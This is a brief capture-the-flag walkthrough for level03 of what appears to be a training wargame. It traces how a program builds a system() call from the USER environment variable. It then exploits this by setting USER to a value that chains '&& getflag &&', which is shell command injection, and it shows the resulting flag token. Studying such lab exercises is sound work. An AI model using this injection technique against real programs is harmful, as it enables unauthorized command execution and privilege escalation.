# if we look at level03.s
```
...
.LC0:
	.string	"USER"
.LC1:
	.string	"/bin/echo %s is cool"
...
```
# .LC0 get the USER var from ENV
# .LC1 Should be the final string to be exec by system()
# .LC2 the call to system with final string

# so
# system("/bin/echo %s is cool") => system("/bin/echo [USER INPUT] is cool")

# we just need to change the USER var form ENV by what we want like
```
USER='toto && getflag && echo'
```

# the final system sould look like
```
system("/bin/echo toto && getflag && echo is cool")
```

# you just need to launch the program
./level03

# result
```
level03@BornToSec:~$ USER='toto && getflag && echo '
level03@BornToSec:~$ ./level03
toto
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
is cool
calling system("/bin/echo toto && getflag && echo  is cool")\nlevel03@BornToSec:~$
